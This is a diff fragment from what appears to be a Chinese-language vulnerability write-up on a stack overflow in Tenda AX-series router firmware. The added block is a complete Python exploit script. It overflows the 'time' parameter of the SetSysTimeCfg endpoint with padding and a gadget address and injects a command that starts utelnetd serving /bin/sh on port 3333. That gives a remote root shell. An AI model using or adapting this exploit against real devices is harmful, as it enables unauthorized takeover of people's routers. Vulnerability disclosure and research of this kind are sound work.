@@ -22,5 +22,32 @@ v6通过直接调用sscanf被输入到栈上，而缺少相应的安全检查
 
 任意代码执行的攻击脚本：
 
+```python
+# Title: Exploit of Tenda-AX3's buffer overflow 
+# Author: R1nd0&c0rn
+# Date: 2022
+# Vendor Homepage: https://www.tenda.com.cn/
+# Version: AX1806 v1.0.0.1
 
+import requests
+from pwn import *
+
+gadget = 0x37208
+
+url = "https://192.168.2.1/goform/SetSysTimeCfg"
+
+timeType = "manual"
+
+time = b"2022-01-01 "
+
+time += b"a" * 0x380 
+time += b"bbbb"
+time += b";"
+time += b"/usr/sbin/utelnetd -l /bin/sh -p 3333"# command
+time += b":"
+time += b"c" * 0x374 + p32(gadget)
+
+r = requests.post(url, data={'timeType': timeType, 'time': time},verify=False)
+print(r.content)
+```
 
